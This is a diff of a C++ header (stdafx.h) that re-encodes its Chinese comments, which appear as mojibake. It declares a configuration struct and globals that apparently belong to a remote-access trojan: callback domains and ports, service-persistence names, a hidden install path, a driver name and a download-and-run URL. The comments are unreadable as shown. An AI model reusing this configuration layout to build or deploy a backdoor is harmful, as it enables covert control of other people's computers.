@@ -1,4 +1,4 @@
-ï»¿// stdafx.h : include file for standard system include files,
+// stdafx.h : include file for standard system include files,
 //  or project specific include files that are used frequently, but
 //      are changed infrequently
 //
@@ -23,38 +23,38 @@
 #include <map>
 #include "sal.h"
 
-//é…ç½®ä¿¡æ¯ç»“æ„ä½“
+//ÅäÖÃĞÅÏ¢½á¹¹Ìå
 struct MODIFY_DATA
 {
-	TCHAR szDns1[300];      //ä¸Šçº¿åœ°å€1
-	TCHAR szDns2[300];      //ä¸Šçº¿åœ°å€2
-	DWORD dwPort1;          //ä¸Šçº¿ç«¯å£1
-	DWORD dwPort2;          //ä¸Šçº¿ç«¯å£2
-	TCHAR szGroup[50];      //ä¸Šçº¿åˆ†ç»„
-	TCHAR szVersion[32];    //ä¸Šçº¿ç‰ˆæœ¬
-	TCHAR SerName[100];     //æœåŠ¡åç§°
-	TCHAR Serdisplay[128];  //æ˜¾ç¤ºåç§°
-	TCHAR Serdesc[256];     //æœåŠ¡æè¿°
-	TCHAR szGetGroup[256];  //åˆ†ç»„å”¯ä¸€æ ‡è¯†
-	BOOL  bLanPenetrate;    //æ˜¯å¦ä½¿ç”¨äº†å†…ç½‘ç©¿é€
-	BOOL  bService;         //æ˜¯å¦æ˜¯æœåŠ¡å¯åŠ¨
-	BOOL  bRuns;            //æ˜¯å¦æ˜¯å¯åŠ¨ç›®å½•å¯åŠ¨
-	BOOL  bRunOnce;         //æ˜¯å¦ä¸ºç»¿è‰²å®‰è£…
-	TCHAR ReleasePath[100]; //å®‰è£…é€”å¾„
-	TCHAR ReleaseName[50];  //å®‰è£…åç§°
-	WORD  Dele_zd;          //å®‰è£…å¢å¤§
-	WORD  FileAttribute;    //æ–‡ä»¶å±æ€§
-	BOOL Dele_Kzj;          //ç¦»çº¿è®°å½•
-	TCHAR szDownRun[512];   //ä¸‹è½½è¿è¡Œåœ°å€
+	TCHAR szDns1[300];      //ÉÏÏßµØÖ·1
+	TCHAR szDns2[300];      //ÉÏÏßµØÖ·2
+	DWORD dwPort1;          //ÉÏÏß¶Ë¿Ú1
+	DWORD dwPort2;          //ÉÏÏß¶Ë¿Ú2
+	TCHAR szGroup[50];      //ÉÏÏß·Ö×é
+	TCHAR szVersion[32];    //ÉÏÏß°æ±¾
+	TCHAR SerName[100];     //·şÎñÃû³Æ
+	TCHAR Serdisplay[128];  //ÏÔÊ¾Ãû³Æ
+	TCHAR Serdesc[256];     //·şÎñÃèÊö
+	TCHAR szGetGroup[256];  //·Ö×éÎ¨Ò»±êÊ¶
+	BOOL  bLanPenetrate;    //ÊÇ·ñÊ¹ÓÃÁËÄÚÍø´©Í¸
+	BOOL  bService;         //ÊÇ·ñÊÇ·şÎñÆô¶¯
+	BOOL  bRuns;            //ÊÇ·ñÊÇÆô¶¯Ä¿Â¼Æô¶¯
+	BOOL  bRunOnce;         //ÊÇ·ñÎªÂÌÉ«°²×°
+	TCHAR ReleasePath[100]; //°²×°Í¾¾¶
+	TCHAR ReleaseName[50];  //°²×°Ãû³Æ
+	WORD  Dele_zd;          //°²×°Ôö´ó
+	WORD  FileAttribute;    //ÎÄ¼şÊôĞÔ
+	BOOL Dele_Kzj;          //ÀëÏß¼ÇÂ¼
+	TCHAR szDownRun[512];   //ÏÂÔØÔËĞĞµØÖ·
 };
 // TODO: reference additional headers your program requires here
-extern WORD    InstallMode;    // è¿è¡Œæ¨¡å¼
-extern UINT    ConnectType;    // ä¸Šçº¿ç±»å‹
-extern LPCTSTR lpConnInfos[2]; // ä¸Šçº¿åŸŸå
-extern DWORD   dwConnPorts[2]; // ä¸Šçº¿ç«¯å£
-extern LPTSTR  lpszUserSid;    // æ´»åŠ¨å¸å·
-extern char*   lpDriverName;   // é©±åŠ¨åç§°
-extern char *scEXEName; //æ¥å…¥çš„å‚æ•°
+extern WORD    InstallMode;    // ÔËĞĞÄ£Ê½
+extern UINT    ConnectType;    // ÉÏÏßÀàĞÍ
+extern LPCTSTR lpConnInfos[2]; // ÉÏÏßÓòÃû
+extern DWORD   dwConnPorts[2]; // ÉÏÏß¶Ë¿Ú
+extern LPTSTR  lpszUserSid;    // »î¶¯ÕÊºÅ
+extern char*   lpDriverName;   // Çı¶¯Ãû³Æ
+extern char *scEXEName; //½ÓÈëµÄ²ÎÊı
 
 //{{AFX_INSERT_LOCATION}}
 // Microsoft Visual C++ will insert additional declarations immediately before the previous line.
